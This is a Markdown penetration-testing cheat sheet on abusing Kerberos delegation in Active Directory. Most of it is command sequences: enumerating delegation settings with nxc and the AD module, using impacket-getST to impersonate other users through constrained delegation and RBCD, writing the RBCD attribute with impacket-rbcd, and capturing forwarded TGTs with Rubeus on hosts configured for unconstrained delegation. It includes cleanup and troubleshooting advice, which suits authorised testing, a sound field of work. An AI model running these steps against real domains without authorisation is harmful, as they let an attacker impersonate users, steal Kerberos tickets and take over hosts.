# Kerberos delegation

Delegation lets a controlled account authenticate to a service as another user. The service still applies that user's permissions.

| Configuration | Where | Needs |
| --- | --- | --- |
| Constrained | `msDS-AllowedToDelegateTo` on the front end | Front-end key/TGT + an allowed SPN |
| Protocol transition | `TRUSTED_TO_AUTH_FOR_DELEGATION` (`0x1000000`) | S4U2Self works without a user ticket |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the back end | Control of a service account + write right on that attribute |
| Unconstrained | `TRUSTED_FOR_DELEGATION` (`0x80000`) | Control of the host + a Kerberos auth that forwards a TGT |

- RBCD is configured on the target, not the front end. A readable descriptor is not write permission.
- Missing protocol-transition flag does not rule out delegation: use `-additional-ticket`.

## Enumerate
```bash
nxc ldap <DC-FQDN> -d <DOMAIN.TLD> -u <USER> -p '<PW>' --find-delegation
```
PowerView: [delegation queries](powerview.md#delegation). AD module:
```powershell
$DC = '<DC-FQDN>'
Get-ADComputer -Identity '<COMPUTER>' -Server $DC -Properties `
    servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo',`
    'msDS-AllowedToActOnBehalfOfOtherIdentity',PrincipalsAllowedToDelegateToAccount |
    Format-List Name,SID,servicePrincipalName,userAccountControl,`
        'msDS-AllowedToDelegateTo',PrincipalsAllowedToDelegateToAccount
Get-ADUser -Identity '<SVC>' -Server $DC -Properties `
    servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo' |
    Format-List SamAccountName,SID,servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo'
setspn.exe -Q cifs/<FQDN>
```
- Protected Users and "sensitive and cannot be delegated" accounts reject the chain: impersonate an ordinary user.
- Kerberos needs FQDN, DNS and time sync → [kerberos-troubleshooting](kerberos-troubleshooting.md).

## Constrained delegation
```bash
impacket-getST -dc-ip <DC-IP> -spn cifs/<FQDN> \
  -impersonate <IMPERSONATE> '<DOMAIN.TLD>/<SVC>'
export KRB5CCNAME=<printed>.ccache
klist -c "$KRB5CCNAME"
impacket-smbclient -k -no-pass '<DOMAIN.TLD>/<IMPERSONATE>@<FQDN>'
```
```text
shares
use <SHARE>
ls
exit
```
- Keys belong to the delegating account: `-aesKey <KEY> -no-pass` or `-hashes :<NT>`.
- Kerberos-only constrained delegation (no protocol transition): supply a forwardable ticket with `-additional-ticket <FILE>`.
- `-force-forwardable` is a patch-dependent bypass.
- Share listing ≠ local admin.

## RBCD
Needs an existing controlled account with a key/TGT and an SPN (machine-account quota alone does not mean you may create one in that container). Read first and write only if your SID is absent.
```bash
impacket-rbcd -dc-ip <DC-IP> -dc-host <DC-FQDN> -ldaps \
  -delegate-to '<TARGET>$' -action read '<DOMAIN.TLD>/<USER>'
impacket-rbcd -dc-ip <DC-IP> -dc-host <DC-FQDN> -ldaps \
  -delegate-to '<TARGET>$' -delegate-from '<COMPUTER>$' -action write '<DOMAIN.TLD>/<USER>'

impacket-getST -dc-ip <DC-IP> -spn cifs/<FQDN> \
  -impersonate <IMPERSONATE> '<DOMAIN.TLD>/<COMPUTER>$'
```
Use the printed cache with `impacket-smbclient -k -no-pass` as above. Remove only your SID afterwards:
```bash
impacket-rbcd -dc-ip <DC-IP> -dc-host <DC-FQDN> -ldaps \
  -delegate-to '<TARGET>$' -delegate-from '<COMPUTER>$' -action remove '<DOMAIN.TLD>/<USER>'
impacket-rbcd -dc-ip <DC-IP> -dc-host <DC-FQDN> -ldaps \
  -delegate-to '<TARGET>$' -action read '<DOMAIN.TLD>/<USER>'
```
- `write` appends to the existing descriptor, `remove` deletes entries matching the SID, `flush` clears the whole list.
- If the attribute already had entries, note them before writing (the `read` output).

## Unconstrained delegation
DCs always show up in enumeration: look for member servers you control. Needs an elevated session on that host and a delegable **Kerberos** authentication to it (NTLM forwards nothing).
```powershell
.\Rubeus.exe monitor /targetuser:<IMPERSONATE> /interval:5 /nowrap
```
From another domain host, as the target user, connect by FQDN:
```cmd
dir \\<FQDN>\<SHARE>
```
- Look for a `krbtgt/<REALM>` ticket in the monitor output. A CIFS ticket alone is not a forwarded TGT.
- Captured TGT → [tickets](tickets.md).

## Troubleshooting
| Symptom | Check |
| --- | --- |
| `KDC_ERR_BADOPTION` | Direction, allowed SPN, forwardable evidence ticket, impersonated-user protections, classic vs RBCD |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN registration, duplicates, service class, FQDN, realm |
| `KDC_ERR_ETYPE_NOSUPP` | Key type, account encryption types, DC config |
| RBCD edit denied | Attribute write right, deny ACEs, exact target, LDAPS |
| Ticket issued, SMB denied | Cache client/server, `-k` used, share/NTFS rights |
| Monitor sees nothing | Kerberos (not NTLM), forwarded TGT, privileges, user protections |
